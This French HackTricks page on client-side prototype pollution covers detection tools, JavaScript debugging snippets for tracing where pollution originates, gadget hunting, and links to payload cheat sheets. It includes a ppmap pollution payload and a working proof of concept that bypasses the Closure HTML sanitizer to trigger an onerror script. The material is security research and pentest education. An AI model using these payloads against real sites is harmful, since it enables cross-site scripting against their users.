# Pollution de Prototype Côté Client

{{#include ../../../banners/hacktricks-training.md}}

## Découverte à l'aide d'outils automatiques

Les outils [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **et** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) peuvent être utilisés pour **trouver des vulnérabilités de pollution de prototype**.

De plus, vous pouvez également utiliser l'**extension de navigateur** [**PPScan**](https://github.com/msrkp/PPScan) pour **scanner automatiquement** les **pages** que vous **accédez** à la recherche de vulnérabilités de pollution de prototype.

### Débogage de l'utilisation d'une propriété <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Trouver la cause profonde de la pollution de prototype <a href="#id-5530" id="id-5530"></a>

Une fois qu'une vulnérabilité de pollution de prototype a été identifiée par l'un des outils, et si le code n'est pas trop complexe, vous pourriez trouver la vulnérabilité en recherchant des mots-clés tels que `location.hash`, `decodeURIComponent` ou `location.search` dans les outils de développement Chrome. Cette approche vous permet de localiser la section vulnérable du code JavaScript.

Pour des bases de code plus grandes et plus complexes, une méthode simple pour découvrir le code vulnérable implique les étapes suivantes :

1. Utilisez un outil pour identifier une vulnérabilité et obtenir un payload conçu pour définir une propriété dans le constructeur. Un exemple fourni par ppmap pourrait ressembler à : `constructor[prototype][ppmap]=reserved`.
2. Définissez un point d'arrêt à la première ligne de code JavaScript qui s'exécutera sur la page. Actualisez la page avec le payload, en mettant l'exécution en pause à ce point d'arrêt.
3. Pendant que l'exécution JavaScript est en pause, exécutez le script suivant dans la console JS. Ce script signalera quand la propriété 'ppmap' est créée, aidant à localiser son origine :
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. Retournez à l'onglet **Sources** et sélectionnez "Reprendre l'exécution du script". Le JavaScript continuera à s'exécuter, et la propriété 'ppmap' sera polluée comme prévu. L'utilisation de l'extrait fourni facilite l'identification de l'emplacement exact où la propriété 'ppmap' est polluée. En examinant la **Call Stack**, différentes piles où la pollution s'est produite peuvent être observées.

Lors de la décision sur quelle pile enquêter, il est souvent utile de cibler les piles associées aux fichiers de bibliothèques JavaScript, car la pollution de prototype se produit fréquemment dans ces bibliothèques. Identifiez la pile pertinente en examinant son attachement aux fichiers de bibliothèque (visible sur le côté droit, similaire à une image fournie pour orientation). Dans les scénarios avec plusieurs piles, comme celles des lignes 4 et 6, le choix logique est la pile de la ligne 4, car elle représente la première occurrence de pollution et donc la cause profonde de la vulnérabilité. Cliquer sur la pile vous dirigera vers le code vulnérable.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Trouver des gadgets de script

Le gadget est le **code qui sera abusé une fois qu'une vulnérabilité PP est découverte**.

Si l'application est simple, nous pouvons **chercher** des **mots-clés** comme **`srcdoc/innerHTML/iframe/createElement`** et examiner le code source pour vérifier s'il **mène à l'exécution de javascript**. Parfois, les techniques mentionnées peuvent ne pas trouver de gadgets du tout. Dans ce cas, une simple révision du code source révèle de jolis gadgets comme l'exemple ci-dessous.

### Exemple de recherche de gadget PP dans le code de la bibliothèque Mithil

Vérifiez cette rédaction : [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompilation des charges utiles pour les bibliothèques vulnérables

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Contournement des assainisseurs HTML via PP

[**Cette recherche**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) montre des gadgets PP à utiliser pour **contourner les assainissements** fournis par certaines bibliothèques d'assainisseurs HTML :

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Références

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
